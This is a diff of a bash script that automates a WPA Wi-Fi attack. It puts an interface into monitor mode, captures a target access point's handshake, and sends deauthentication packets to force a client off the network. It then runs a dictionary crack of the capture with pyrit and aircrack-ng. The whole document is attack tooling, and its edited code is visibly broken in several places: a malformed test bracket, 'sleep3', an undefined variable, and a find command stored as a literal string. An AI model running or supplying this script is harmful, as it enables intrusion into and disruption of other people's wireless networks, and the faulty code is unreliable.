@@ -8,7 +8,7 @@ read -p "What Interface will you use: " Iface;
 mon=$Iface'mon';
 read -p "What is the friendly name of the AP: " ESSID;
 read -p "what is the MAC of the AP: " BSSID;
-read -p "What Channel is the AP on: " Chan;
+read -p "What Channel is the AP on: " chn;
 
 #Lets Play ball
 echo "checking for Project Folder";
@@ -23,7 +23,7 @@ fi
 
 echo "checking wlan1mon";
 airmon-ng check kill
-airmon-ng start $Iface --channel $Chan
+airmon-ng start $Iface --channel $chn
 echo "monitor is set on $mon";
 echo "For Good Riddance we need to wait a second";
 
@@ -31,22 +31,23 @@ echo "Pasting to new shell";
 gnome-terminal -x sh -c "
 	sleep 4;
 	cd ../$Proj;
-	airodump-ng -c $Chan --bssid $BSSID -w $Proj $mon;
+	airodump-ng -c $chn --bssid $BSSID -w $Proj $mon;
 	"
 echo "Check airoDump Manually for a Client";
 sleep 10;
 read -p "Do you have a client Mac: " Client;
 
 deauth(){
-read -p "How many Deauths you want to send: " da;
+read -p "How many Deauths you want to send: " dauth;
 
 echo "Opening new Shell for Deauth";
 
 gnome-terminal -x sh -c "
 	sleep 3;
-	aireplay-ng -0 $da -a $BSSID -c $Client $mon;
+	aireplay-ng -0 $dauth -a $BSSID -c $Client $mon;
 	"
-sleep $da;
+echo "sleeping for " $deauth
+sleep $dauth;
 echo "deauths send"
 }
 deauth;
@@ -63,23 +64,32 @@ while true; do
 	esac
 done
 
-echo "starting Pyrit cap analyze"
-
-read -p "do you have a wordlist ready? Path: " dic;
-#dic=../wordlist/export.db
-
-cd ../$Proj;
-cap='find *.cap' ;
-
-echo "ready to analyze  " $cap
-pyrit -r $cap analyze;
+echo "looking for wordlist and starting attack"
 
 
+dic=wordlist/export.db
 
+if [-f $dic ]; then
+	echo "Loading dictionary"
 
+	gnome-terminal -x sh -c "
+		cd ../$Proj;
+		sleep3;
+		pyrit eval;
+
+		sleep3;
+		cap='find *.cap';
+		echo "ready to analyze  " $cap
+		pyrit -r $cap analyze;
+		read -n1 -p "Press Enter to Exit" key;
+	"
+else
+	read -p "do you have a wordlist ready? Path: " dic;
+fi
 
 gnome-terminal -x sh -c "
         sleep 3;
-        aircrack-ng -w  $dic -b $BSSID $result;
+        aircrack-ng -w  $dic -b $BSSID $cap;
         "
+echo "Hope you were lucky!!!!"
 read -n1 -p "Press Enter to Exit" key;
